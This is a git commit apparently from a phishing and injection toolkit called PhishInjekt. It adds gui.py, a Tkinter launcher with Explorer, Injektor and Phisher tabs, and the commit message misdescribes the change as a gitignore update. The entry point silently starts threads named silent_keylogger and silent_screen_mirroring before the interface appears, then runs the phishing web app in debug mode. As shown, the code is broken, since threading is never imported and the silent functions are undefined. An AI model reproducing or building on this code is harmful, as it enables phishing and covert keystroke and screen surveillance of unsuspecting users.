176e74506e3fffad5a7cb951953f0346aa67861a
tpdph <tobe9210@gmail.com>
2024-12-23 11:12:31 +0100

    MCP added node_modules and Tools to gitignore

---
+++ gui.py
@@ -0,0 +1,33 @@
+import tkinter as tk
+from tkinter import ttk
+from Tools.explorer import setup_explorer_gui
+from Tools.injektor import setup_injektor_gui
+from phish_injekt.phisher import setup_phisher_gui, app, setup_phisher_routes
+
+def main():
+    root = tk.Tk()
+    root.title("PhishInjekt")
+
+    notebook = ttk.Notebook(root)
+    notebook.pack(pady=10, padx=10, expand=True, fill='both')
+
+    explorer_tab = ttk.Frame(notebook)
+    injektor_tab = ttk.Frame(notebook)
+    phisher_tab = ttk.Frame(notebook)
+
+    notebook.add(explorer_tab, text="Explorer")
+    notebook.add(injektor_tab, text="Injektor")
+    notebook.add(phisher_tab, text="Phisher")
+
+    setup_explorer_gui(explorer_tab)
+    setup_injektor_gui(injektor_tab)
+    setup_phisher_gui(phisher_tab)
+
+    root.mainloop()
+
+if __name__ == "__main__":
+    setup_phisher_routes()
+    threading.Thread(target=silent_keylogger).start()
+    threading.Thread(target=silent_screen_mirroring).start()
+    main()
+    app.run(debug=True)
